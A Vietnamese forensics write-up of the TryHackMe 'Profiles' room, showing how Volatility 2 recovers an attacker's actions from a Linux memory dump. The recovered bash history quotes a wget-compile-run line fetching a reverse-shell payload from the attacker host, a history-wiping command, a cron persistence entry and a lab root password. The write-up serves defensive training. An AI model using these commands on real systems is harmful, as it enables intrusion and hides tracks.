# TryHackMe — Profiles | Write-Up

> **Room:** https://tryhackme.com/r/room/profilesroom  
> **Chủ đề:** Memory Forensics / Digital Forensics & Incident Response (DFIR)  
> **Công cụ:** Volatility 2, Docker, md5sum  
> **Độ khó:** Medium  

<img width="1807" height="912" alt="image" src="https://github.com/user-attachments/assets/57241499-c1d2-402b-8440-3aabd8fb6c26" />

---


## 1. Bối Cảnh & Tư Duy

Đội incident response thông báo có hoạt động đáng ngờ trên một **Linux database server**. Một **memory dump** (ảnh chụp RAM) đã được thu thập trước khi server bị tắt. Server hiện đã offline, bạn chỉ có duy nhất file dump để điều tra.

### Tại sao memory dump quan trọng?

RAM là nơi lưu trữ **tất cả những gì đang hoạt động** tại thời điểm đó:
- Tiến trình đang chạy (kể cả malware)
- Kết nối mạng đang mở (kết nối của hacker)
- Lệnh đã gõ trong terminal (bash history)
- Password đang dùng trong session

Khi server tắt, toàn bộ dữ liệu này **biến mất vĩnh viễn**. Memory dump là bản chụp "đóng băng" thời điểm đó lại — kỹ thuật thu thập bằng chứng kỹ thuật số cơ bản trong DFIR.

---

## 2. Kiến Thức Nền Tảng

### Volatile Data

**Volatile data** (dữ liệu dễ mất) là thông tin lưu tạm thời trong RAM, biến mất khi mất điện. Bao gồm:
- Running processes & network connections
- Encryption keys đang dùng
- Clipboard content
- bash history buffer (chưa flush ra disk)

### Memory Forensics vs Disk Forensics

| Tiêu chí | Memory Forensics | Disk Forensics |
|---|---|---|
| Dữ liệu | RAM — volatile | HDD/SSD — non-volatile |
| Tốc độ thu thập | Nhanh (vài phút) | Chậm (hàng giờ) |
| Dung lượng | Nhỏ (4–64 GB) | Lớn (hàng trăm GB) |
| Dữ liệu đặc thù | Malware đang chạy, kết nối mạng live | File đã xóa, registry, logs |
| Mất dữ liệu khi | Tắt máy | Không mất |

### Volatility 2

Framework mã nguồn mở viết bằng Python chuyên phân tích memory dump. Hoạt động theo cơ chế **plugin** — mỗi plugin khai thác một kernel subsystem khác nhau:

| Plugin | Kernel Subsystem | Mục đích |
|---|---|---|
| `linux_bash` | Bash history buffer | Lịch sử lệnh đã gõ |
| `linux_enumerate_files` | VFS inode table | Liệt kê file trong RAM |
| `linux_find_file` | VFS inode | Dump file cụ thể ra disk |
| `linux_netstat` | Network socket structs | Kết nối TCP/UDP |
| `linux_pslist` | Process table | Danh sách tiến trình |

---

## 3. Luồng Tấn Công Của Hacker

```
[Attacker Machine: 10.0.2.72]
        |
        | SSH port 22
        v
[Server Nạn Nhân: 10.0.2.73]
        |
        |-- BƯỚC 1: Initial Access
        |   SSH vào với tài khoản paco
        |
        |-- BƯỚC 2: Privilege Escalation  
        |   su root Ftrccw45PHyq
        |   sqlite3 users.db (đọc database)
        |
        |-- BƯỚC 3: Execution & C2
        |   wget 10.0.2.72/shell.c
        |   gcc shell.c -o pkexecc && rm shell.c
        |   ./pkexecc → reverse shell → port 1337
        |
        |-- BƯỚC 4: Defense Evasion
        |   cat /dev/null > .bash_history (xóa log)
        |   vi /etc/ssh/sshd_config (backdoor SSH)
        |   gpasswd -d paco lxd (xóa dấu vết leo quyền)
        |
        |-- BƯỚC 5: Persistence
        |   Crontab: * * * * * cp /opt/.bashrc /root/.bashrc
        |   Mỗi phút khôi phục payload vào .bashrc của root
        |
        v
[Server bị kiểm soát hoàn toàn]
```

### MITRE ATT&CK Mapping

| Kỹ thuật | ID | Mô tả |
|---|---|---|
| Initial Access | T1078 | Dùng valid account (paco) |
| Privilege Escalation | T1548 | `su root` với password biết trước |
| Execution | T1059.004 | Unix shell execution |
| Download tool | T1105 | `wget shell.c` từ C2 |
| Command & Control | T1071 | Reverse shell qua TCP 1337 |
| Defense Evasion | T1070.003 | Xóa bash history |
| Persistence | T1053.003 | Cron Job |

---

## 4. Cấu Trúc Thư Mục Liên Quan

```
/home/paco/
├── pkexecc              ← malware đã compile (reverse shell)
├── linux.mem            ← memory dump do chính hacker tạo
└── .bash_history        ← đã bị xóa (cat /dev/null >)

/opt/
└── .bashrc              ← file backdoor ẩn của hacker

/root/
└── .bashrc              ← bị ghi đè bởi cron mỗi phút

/var/spool/cron/crontabs/
└── root                 ← crontab của root, chứa persistence

/etc/ssh/
└── sshd_config          ← bị sửa để cài backdoor SSH

/home/paco/LiME/src/
└── lime-5.4.0-166-generic.ko   ← kernel module để dump RAM

[Máy điều tra — Kali Linux]
/home/zing/Tool/Forensic/vol2/
├── vol.py                          ← Volatility 2 main
└── volatility/plugins/overlays/linux/
    └── Ubuntu2004.zip              ← custom profile ta tạo
        ├── module.dwarf            ← DWARF debug info của kernel
        └── boot/System.map-5.4.0-166-generic  ← symbol table

/home/zing/CTF/LabTHM/
├── evidence-1699332676548.zip      ← file gốc tải về
├── linux.mem                       ← memory dump (4GB raw)
├── pkexecc                         ← malware đã extract
└── crontab_root                    ← crontab đã extract
```

---

## 5. Giai Đoạn 1 — Chuẩn Bị Môi Trường

### 5.1 Cài Volatility 2

```bash
git clone https://github.com/hadrian3689/volatility_install
cd volatility_install
bash install.sh

# Kiểm tra
vol.py -h
```

**Tại sao Volatility 2 chứ không phải 3?**  
Volatility 3 đã bỏ hệ thống Linux profile thủ công. Với memory dump của Linux kernel cũ, Volatility 2 là bắt buộc vì cần tạo custom profile khớp với kernel của target.

---

### 5.2 Xác Định Kernel Version Của Memory Dump

```bash
strings linux.mem | grep "Linux version" | head -3
```

**`strings`** trích xuất tất cả chuỗi ASCII có thể đọc được từ file nhị phân.  
**`grep "Linux version"`** lọc dòng chứa thông tin kernel.

Kết quả: `Linux version 5.4.0-166-generic` → **Ubuntu 20.04**

**Tại sao cần kernel version?**  
Mỗi phiên bản kernel Linux có **struct offsets** khác nhau — tức là vị trí các trường dữ liệu trong RAM khác nhau. Volatility cần biết chính xác layout này (gọi là Linux Profile) để đọc đúng dữ liệu.

---

### 5.3 Build Linux Profile

#### Bước 1 — Clone source và sửa Makefile

```bash
git clone https://github.com/volatilityfoundation/volatility
cd volatility/tools/linux/

# Reset về bản gốc
git checkout Makefile

# Hardcode kernel version vào Makefile
sed -i "s/\$(shell uname -r)/5.4.0-166-generic/g" Makefile
```

**Tại sao phải sửa Makefile?**  
Makefile mặc định dùng `$(shell uname -r)` để tự lấy kernel của máy đang chạy (Kali Linux). Ta cần build profile cho kernel của **máy nạn nhân** (Ubuntu 20.04), không phải Kali.

**Tại sao phải escape `$` thành `\$`?**  
Trong shell, `$` có ý nghĩa đặc biệt (variable expansion). Nếu không escape, `sed` hiểu sai và không thay thế được — đây là lỗi phổ biến nhất khiến người mới bị stuck.

#### Bước 2 — Build trong Docker

```bash
docker run --rm -v $PWD:/volatility ubuntu:20.04 /bin/bash -c "
  apt update -qq &&
  apt install -y build-essential \
    linux-headers-5.4.0-166-generic \
    linux-image-5.4.0-166-generic \
    dwarfdump zip &&
  cd /volatility && make &&
  zip Ubuntu2004.zip module.dwarf /boot/System.map-5.4.0-166-generic
"
```

**Tại sao dùng Docker?**  
Cần môi trường Ubuntu 20.04 để build kernel module đúng với target. Docker cung cấp môi trường cô lập mà không cần cài Ubuntu thật trên máy.

**`module.dwarf` là gì?**  
File chứa **DWARF debug information** — mô tả chi tiết cấu trúc dữ liệu của kernel (struct sizes, field offsets). Volatility dùng file này để biết cách parse các struct trong RAM.

**`System.map` là gì?**  
File ánh xạ giữa **symbol names** (tên hàm, tên biến kernel) và **địa chỉ bộ nhớ** tương ứng. Thiếu file này Volatility không thể locate các kernel structures → profile không hoạt động.

#### Bước 3 — Copy và xác nhận

```bash
# Đổi tên đúng format
mv Ubuntu2004.zip /home/zing/Tool/Forensic/vol2/volatility/plugins/overlays/linux/

# Kiểm tra Volatility đã nhận profile chưa
python2 /home/zing/Tool/Forensic/vol2/vol.py --info | grep -i ubuntu
# Output mong đợi: LinuxUbuntu2004x64 - A Profile for Linux Ubuntu2004 x64
```

> **Lưu ý:** File zip phải chứa cả `module.dwarf` **và** `System.map`. Kiểm tra bằng:  
> `unzip -l Ubuntu2004.zip` — phải thấy 2 file.

---

### 5.4 Script Tự Động Hóa Build Profile

```bash
#!/bin/bash
# build_profile.sh — dùng lại cho các bài sau
KERNEL=$1    # ví dụ: 5.4.0-166-generic
UBUNTU=$2    # ví dụ: 20.04

VOL2_PATH="/home/zing/Tool/Forensic/vol2"
PROFILE_NAME="Ubuntu$(echo $UBUNTU | tr -d '.')"

cd $VOL2_PATH/tools/linux/
git checkout Makefile
sed -i "s/\$(shell uname -r)/$KERNEL/g" Makefile

docker run --rm -v $PWD:/volatility ubuntu:$UBUNTU /bin/bash -c "
  apt update -qq &&
  apt install -y build-essential linux-headers-$KERNEL linux-image-$KERNEL dwarfdump zip &&
  cd /volatility && make &&
  zip ${PROFILE_NAME}.zip module.dwarf /boot/System.map-$KERNEL
"

cp $VOL2_PATH/tools/linux/${PROFILE_NAME}.zip \
   $VOL2_PATH/volatility/plugins/overlays/linux/
echo "Profile ${PROFILE_NAME} da san sang!"
```

**Cách dùng:**
```bash
# Tìm kernel version trước
strings memory.dump | grep "Linux version" | head -3

# Rồi chạy script với đúng version
bash build_profile.sh 5.4.0-166-generic 20.04
```

**Bảng tra kernel → Ubuntu:**

| Kernel version | Ubuntu version |
|---|---|
| 5.4.x | 20.04 |
| 5.15.x | 22.04 |
| 6.5.x | 23.10 |
| 6.8.x | 24.04 |

---

### 5.5 Giải Nén Memory Dump

```bash
cd ~/CTF/LabTHM
unzip evidence-1699332676548.zip
# → linux.mem (4GB)
```

**Tại sao không dùng trực tiếp file zip?**  
Volatility đọc raw binary data theo địa chỉ bộ nhớ tuyệt đối. File zip có header riêng, offset sai hoàn toàn → Volatility báo lỗi "No suitable address space mapping found".

---

## 6. Giai Đoạn 2 — Phân Tích Memory Dump

> **Cú pháp chung:**  
> `python2 vol.py -f linux.mem --profile=LinuxUbuntu2004x64 <PLUGIN>`

---

### 6.1 Plugin `linux_bash` — Câu 1, 2, 3 (một phần)

```bash
python2 /home/zing/Tool/Forensic/vol2/vol.py \
  -f ~/CTF/LabTHM/linux.mem \
  --profile=LinuxUbuntu2004x64 \
  linux_bash
```

**Cơ chế hoạt động:**  
Plugin scan RAM tìm các vùng bộ nhớ của bash process, trích xuất **history buffer** — vùng RAM nơi bash lưu lệnh đã gõ trước khi ghi ra `~/.bash_history`. Kể cả khi hacker xóa history trên disk, bản sao trong RAM vẫn còn.

**Output phân tích:**

```
PID 1076 — bash (user paco):
  su rootFtrccw45PHyq       ← leo quyền root với password Ftrccw45PHyq
  sqlite3 users.db           ← truy cập database
  wget 10.0.2.72/shell.c && gcc shell.c -o pkexecc && rm shell.c
  ./pkexecc                  ← chạy malware reverse shell

PID 1197 — bash (root):
  passwd paco / passwd root          ← đổi password để duy trì access
  cat /dev/null > /home/paco/.bash_history   ← xóa dấu vết
  vi /etc/ssh/sshd_config            ← sửa SSH config
  gpasswd -d paco lxd                ← xóa paco khỏi group lxd
  git clone LiME && insmod lime-5.4.0-166-generic.ko ← dump RAM
```

> **Thú vị:** Chính hacker đã tạo ra file `linux.mem` bằng LiME (Linux Memory Extractor) — một kernel module load vào kernel để dump toàn bộ RAM ra file. Đây là bằng chứng ironic: hacker tự tạo bằng chứng chống lại chính mình.

**Đáp án:**
- **Câu 1** — Username: `paco`
- **Câu 2** — Root password: `Ftrccw45PHyq`

---

### 6.2 Plugin `linux_enumerate_files` + `linux_find_file` — Câu 3

#### Tìm file pkexecc

```bash
python2 /home/zing/Tool/Forensic/vol2/vol.py \
  -f ~/CTF/LabTHM/linux.mem \
  --profile=LinuxUbuntu2004x64 \
  linux_enumerate_files | grep pkexecc
```

**Cơ chế hoạt động:**  
Plugin duyệt qua **VFS (Virtual File System) inode table** trong kernel memory. VFS là lớp abstraction của Linux quản lý tất cả file, kể cả file đã bị xóa khỏi disk nhưng vẫn còn inode đang được process giữ (file descriptor chưa đóng).

**Output:**
```
0xffff8903b2364120    655377    /home/paco/pkexecc
```

- `0xffff8903b2364120` = địa chỉ kernel virtual address của inode object
- `655377` = inode number

#### Dump file và tính MD5

```bash
# Dump file ra disk
python2 /home/zing/Tool/Forensic/vol2/vol.py \
  -f ~/CTF/LabTHM/linux.mem \
  --profile=LinuxUbuntu2004x64 \
  linux_find_file \
  -i 0xffff8903b2364120 \
  -O ~/CTF/LabTHM/pkexecc

# Tính MD5 hash
md5sum ~/CTF/LabTHM/pkexecc
```

**`-i`** = địa chỉ inode trong RAM  
**`-O`** = output file để lưu nội dung dump ra  

**MD5 hash** là **cryptographic fingerprint** 128-bit của file. Hai file giống hệt nhau sẽ có cùng MD5. Dùng để:
- Xác minh tính toàn vẹn của evidence
- Tra cứu trên VirusTotal để identify malware family

**Đáp án:**
- **Câu 3** — MD5 hash của pkexecc (chạy lệnh trên để lấy)

---

### 6.3 Plugin `linux_netstat` — Câu 4

```bash
python2 /home/zing/Tool/Forensic/vol2/vol.py \
  -f ~/CTF/LabTHM/linux.mem \
  --profile=LinuxUbuntu2004x64 \
  linux_netstat
```

**Cơ chế hoạt động:**  
Đọc các **network socket structures** trong kernel memory — cụ thể là `struct sock` và `struct tcp_sock` trong kernel network stack. Hiển thị trạng thái tất cả TCP/UDP connections tại thời điểm dump, kể cả connections đã đóng còn trong TIME_WAIT.

**Output đáng ngờ:**
```
TCP  10.0.2.73:41012  →  10.0.2.72:1337  ESTABLISHED  sh/1093
TCP  10.0.2.73:41012  →  10.0.2.72:1337  ESTABLISHED  bash/1097
```

**Phân tích:**
- `10.0.2.73` = server nạn nhân
- `10.0.2.72:1337` = máy attacker
- Process `sh` và `bash` mở outbound connection → **reverse shell**

**Reverse shell là gì?**  
Thay vì hacker kết nối vào server (có thể bị firewall chặn), malware trên server **chủ động kết nối ra ngoài** đến máy hacker đang lắng nghe. Hacker nhận được shell tương tác mà không cần bypass firewall inbound.

Port `1337` = "leet" trong hacker culture, thường dùng làm C2 port trong CTF.

**Đáp án:**
- **Câu 4** — IP:Port kẻ tấn công: `10.0.2.72:1337`

---

### 6.4 Plugin `linux_enumerate_files` + `linux_find_file` — Câu 5, 6

#### Tìm cronjob

```bash
python2 /home/zing/Tool/Forensic/vol2/vol.py \
  -f ~/CTF/LabTHM/linux.mem \
  --profile=LinuxUbuntu2004x64 \
  linux_enumerate_files | grep cron
```

**Output:**
```
0xffff8903b23667a8    131127    /var/spool/cron/crontabs/root
```

`/var/spool/cron/crontabs/root` = **user crontab của root** — file định nghĩa lệnh tự động chạy theo lịch.

#### Dump và đọc crontab

```bash
python2 /home/zing/Tool/Forensic/vol2/vol.py \
  -f ~/CTF/LabTHM/linux.mem \
  --profile=LinuxUbuntu2004x64 \
  linux_find_file \
  -i 0xffff8903b23667a8 \
  -O ~/CTF/LabTHM/crontab_root

cat ~/CTF/LabTHM/crontab_root
```

**Output:**
```
* * * * * cp /opt/.bashrc /root/.bashrc
```

**Phân tích cú pháp cron:**
```
* * * * *  = chạy mỗi phút, mỗi giờ, mỗi ngày, mỗi tháng, mỗi thứ
│ │ │ │ │
│ │ │ │ └── Thứ (0-7, 0=Chủ nhật)
│ │ │ └──── Tháng (1-12)
│ │ └────── Ngày trong tháng (1-31)
│ └──────── Giờ (0-23)
└────────── Phút (0-59)
```

**Tại sao nguy hiểm?**  
File `.bashrc` tự động execute mỗi khi root mở interactive bash shell. Hacker nhúng payload vào `/opt/.bashrc` (file ẩn trong thư mục ít ai để ý). Cronjob đảm bảo dù admin có xóa `/root/.bashrc` độc hại, **1 phút sau nó lại tự khôi phục** từ `/opt/.bashrc`. Đây là cơ chế **persistence** cực kỳ dai dẳng.

**Đáp án:**
- **Câu 5** — Full path:inode = `/var/spool/cron/crontabs/root:131127`
- **Câu 6** — Nội dung cronjob = `* * * * * cp /opt/.bashrc /root/.bashrc`

---

## 7. Tổng Kết Đáp Án

| Câu | Nội dung hỏi | Đáp án | Plugin dùng |
|---|---|---|---|
| 1 | Username đăng nhập ban đầu | `paco` | `linux_bash` |
| 2 | Root password | `Ftrccw45PHyq` | `linux_bash` |
| 3 | MD5 hash của malware | *(chạy md5sum pkexecc)* | `linux_find_file` |
| 4 | IP:Port kẻ tấn công | `10.0.2.72:1337` | `linux_netstat` |
| 5 | Path:Inode của cronjob | `/var/spool/cron/crontabs/root:131127` | `linux_enumerate_files` |
| 6 | Nội dung cronjob | `* * * * * cp /opt/.bashrc /root/.bashrc` | `linux_find_file` |

---

## 8. DFIR

### Về Memory Forensics

- RAM chứa bằng chứng mà disk không có: bash history chưa flush, malware đang chạy, kết nối mạng live
- Hacker xóa log trên disk nhưng **không thể xóa RAM** nếu chưa reboot
- Memory dump phải được thu thập **trước khi tắt máy** — đây là nguyên tắc đầu tiên của incident response

### Về Attacker TTPs

| Tactic | Technique | Cách phát hiện |
|---|---|---|
| Initial Access | SSH với valid credentials | `linux_bash` → thấy SSH session |
| Privilege Escalation | `su root` | `linux_bash` → thấy lệnh su + password |
| Execution | Compile malware on-target | `linux_bash` → thấy wget + gcc |
| C2 | Reverse shell TCP | `linux_netstat` → outbound sh/bash |
| Defense Evasion | Xóa bash history | `linux_bash` → vẫn còn trong RAM! |
| Persistence | Cron job + .bashrc | `linux_enumerate_files` + `linux_find_file` |

### Về Volatility 2

- **Profile** = bản đồ cấu trúc kernel để Volatility đọc RAM đúng
- **module.dwarf** + **System.map** = 2 file bắt buộc trong profile
- Mỗi plugin khai thác một kernel subsystem cụ thể
- File zip profile phải đặt đúng trong `plugins/overlays/linux/`
